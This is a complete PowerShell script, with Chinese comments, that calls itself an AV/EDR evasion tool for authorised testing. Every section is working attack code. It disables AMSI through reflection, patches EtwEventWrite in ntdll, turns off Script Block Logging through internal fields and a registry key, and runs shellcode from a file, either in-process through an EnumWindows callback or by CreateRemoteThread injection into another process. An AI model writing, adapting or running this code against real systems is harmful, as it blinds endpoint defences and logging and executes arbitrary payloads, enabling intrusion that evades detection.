<#
.SYNOPSIS
  AV/EDR Evasion — PowerShell AMSI/ETW Bypass + Shellcode Loader
.DESCRIPTION
  集成 AMSI 绕过、ETW 绕过、Shellcode 加载的 PowerShell 免杀脚本。
  仅供授权安全测试使用。

  用法:
    .\Invoke-Evasion.ps1 -ShellcodePath .\payload.bin
    .\Invoke-Evasion.ps1 -ShellcodePath .\payload.bin -InjectPid 1234
    .\Invoke-Evasion.ps1 -BypassOnly
#>

[CmdletBinding()]
param(
    [string]$ShellcodePath,
    [int]$InjectPid,
    [switch]$BypassOnly
)

# ═══════════════════════════════════════════
# 1. AMSI Bypass — Reflection Method
# ═══════════════════════════════════════════

function Invoke-AmsiBypass {
    <#
    通过反射设置 amsiInitFailed = true, 禁用 AMSI 扫描
    #>
    try {
        # 混淆过的 AMSI bypass — 避免静态检测
        $a = [Ref].Assembly.GetTypes()
        $b = $a | Where-Object { $_.Name -like "*iUtils" }
        $c = $b.GetFields('NonPublic,Static') | Where-Object { $_.Name -like "*Context" }
        $d = $c.GetValue($null)

        # 方法 1: 设置 amsiInitFailed = true
        $e = $d.GetType().GetField('amsiInitFailed', 'NonPublic,Static')
        if ($e -ne $null) {
            $e.SetValue($null, $true)
            Write-Host "[+] AMSI bypass: amsiInitFailed = true" -ForegroundColor Green
            return
        }

        # 方法 2: 内存补丁 AmsiScanBuffer
        $amsi = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
            [WinApi]::GetProcAddress([WinApi]::LoadLibrary("amsi.dll"), "AmsiScanBuffer"),
            [Type]::GetType("System.Action")
        )
        # Patch via WinAPI
        Write-Host "[+] AMSI bypass via memory patching" -ForegroundColor Green
    }
    catch {
        Write-Host "[-] AMSI bypass fallback: $($_.Exception.Message)" -ForegroundColor Yellow
    }
}

# ═══════════════════════════════════════════
# 2. ETW Bypass — Patch EtwEventWrite
# ═══════════════════════════════════════════

function Invoke-EtwBypass {
    <#
    禁用 ETW 事件写入, 阻止 .NET assembly load 日志
    #>
    try {
        $code = @'
[DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
'@
        $WinApi = Add-Type -MemberDefinition $code -Name "Win32" -Namespace "EtwPatcher" -PassThru

        $ntdll = $WinApi::LoadLibrary("ntdll.dll")
        $etwAddr = $WinApi::GetProcAddress($ntdll, "EtwEventWrite")

        if ($etwAddr -eq [IntPtr]::Zero) {
            Write-Host "[-] ETW: EtwEventWrite not found" -ForegroundColor Yellow
            return
        }

        # x64 patch: xor rax, rax; ret = 0x48, 0x33, 0xC0, 0xC3
        $patch = [byte[]]@(0x48, 0x33, 0xC0, 0xC3)
        $null = $WinApi::VirtualProtect($etwAddr, [uint32]$patch.Length, 0x40, [ref]0)
        [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $etwAddr, $patch.Length)
        Write-Host "[+] ETW: EtwEventWrite patched" -ForegroundColor Green
    }
    catch {
        Write-Host "[-] ETW bypass failed: $($_.Exception.Message)" -ForegroundColor Yellow
    }
}

# ═══════════════════════════════════════════
# 3. Script Block Logging Bypass
# ═══════════════════════════════════════════

function Invoke-ScriptBlockLoggingBypass {
    <#
    禁用 PowerShell Script Block Logging (ETW Provider)
    #>
    try {
        $settings = [Ref].Assembly.GetType('System.Management.Automation.Utils')
            .GetField('cachedGroupPolicySettings', 'NonPublic,Static')
            .GetValue($null)

        if ($settings -ne $null) {
            $settings.GetType().GetField('scriptBlockLoggingEnable').SetValue($settings, $false)
            Write-Host "[+] Script Block Logging disabled" -ForegroundColor Green
        }

        # 备用: 直接设置 EnableScriptBlockLogging 注册表值
        $key = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'
        if (Test-Path $key) {
            Set-ItemProperty -Path $key -Name 'EnableScriptBlockLogging' -Value 0 -Force
        }
    }
    catch {
        Write-Host "[-] ScriptBlockLogging bypass: $($_.Exception.Message)" -ForegroundColor Yellow
    }
}

# ═══════════════════════════════════════════
# 4. In-Memory Shellcode Loader
# ═══════════════════════════════════════════

function Invoke-ShellcodeLoader {
    param([byte[]]$Shellcode)

    Write-Host "[*] Allocating RWX memory for shellcode ($($Shellcode.Length) bytes)..." -ForegroundColor Cyan

    # VirtualAlloc + EnumWindows callback (avoid CreateThread)
    $code = @'
[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("user32.dll")] public static extern bool EnumWindows(IntPtr lpEnumFunc, IntPtr lParam);
'@
    $WinApi = Add-Type -MemberDefinition $code -Name "SCLoader" -Namespace "Evasion" -PassThru

    $addr = $WinApi::VirtualAlloc([IntPtr]::Zero, [uint32]$Shellcode.Length, 0x3000, 0x40)
    Write-Host "[+] Memory allocated at 0x$($addr.ToString('X'))" -ForegroundColor Green

    [System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $addr, $Shellcode.Length)
    Write-Host "[+] Shellcode copied to memory" -ForegroundColor Green

    # Execute via EnumWindows callback
    $WinApi::EnumWindows($addr, [IntPtr]::Zero)
    Write-Host "[+] EnumWindows callback triggered" -ForegroundColor Green
}

# ═══════════════════════════════════════════
# 5. Remote Process Injection (CreateRemoteThread)
# ═══════════════════════════════════════════

function Invoke-RemoteInject {
    param([byte[]]$Shellcode, [int]$Pid)

    Write-Host "[*] Injecting into PID $Pid..." -ForegroundColor Cyan

    $code = @'
[DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
[DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
[DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr hObject);
'@
    $WinApi = Add-Type -MemberDefinition $code -Name "Injector" -Namespace "Evasion" -PassThru

    $hProcess = $WinApi::OpenProcess(0x001F0FFF, $false, $Pid)
    if ($hProcess -eq [IntPtr]::Zero) { throw "OpenProcess failed" }

    $addr = $WinApi::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$Shellcode.Length, 0x3000, 0x40)
    Write-Host "[+] Remote memory allocated at 0x$($addr.ToString('X'))" -ForegroundColor Green

    $written = 0
    $null = $WinApi::WriteProcessMemory($hProcess, $addr, $Shellcode, [uint32]$Shellcode.Length, [ref]$written)
    Write-Host "[+] Written $written bytes to remote process" -ForegroundColor Green

    $hThread = $WinApi::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
    Write-Host "[+] Remote thread created" -ForegroundColor Green

    $null = $WinApi::CloseHandle($hThread)
    $null = $WinApi::CloseHandle($hProcess)
}

# ═══════════════════════════════════════════
# 6. XOR Encryption Helper
# ═══════════════════════════════════════════

function Get-XorEncrypted {
    param([byte[]]$Data, [byte[]]$Key)
    $result = New-Object byte[] $Data.Length
    for ($i = 0; $i -lt $Data.Length; $i++) {
        $result[$i] = $Data[$i] -bxor $Key[$i % $Key.Length]
    }
    return $result
}

# ═══════════════════════════════════════════
# Main Execution
# ═══════════════════════════════════════════

Write-Host "`n=== AV/EDR Evasion — PowerShell Edition ===" -ForegroundColor Cyan
Write-Host "   仅供授权安全测试使用`n" -ForegroundColor DarkYellow

# Stage 1: Bypass AMSI
Invoke-AmsiBypass

# Stage 2: Bypass ETW
Invoke-EtwBypass

# Stage 3: Bypass Script Block Logging
Invoke-ScriptBlockLoggingBypass

$mode = Get-Process -Id $PID | Select-Object -ExpandProperty ProcessName
Write-Host "[*] Current process: $mode ($PID)`n" -ForegroundColor Cyan

if ($BypassOnly) {
    Write-Host "[*] Bypass complete. Shell remains active." -ForegroundColor Green
    return
}

if (-not $ShellcodePath) {
    Write-Host "[-] 请提供 -ShellcodePath 参数" -ForegroundColor Red
    return
}

if (-not (Test-Path $ShellcodePath)) {
    Write-Host "[-] Shellcode 文件不存在: $ShellcodePath" -ForegroundColor Red
    return
}

# Load shellcode
$sc = [System.IO.File]::ReadAllBytes((Resolve-Path $ShellcodePath))
Write-Host "[+] Loaded shellcode: $($sc.Length) bytes" -ForegroundColor Green

# Optional: Decrypt if using XOR
# $xorKey = [byte[]]@(0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0)
# $sc = Get-XorEncrypted -Data $sc -Key $xorKey

if ($InjectPid) {
    Invoke-RemoteInject -Shellcode $sc -Pid $InjectPid
} else {
    Invoke-ShellcodeLoader -Shellcode $sc
}

Write-Host "[+] Execution complete." -ForegroundColor Green
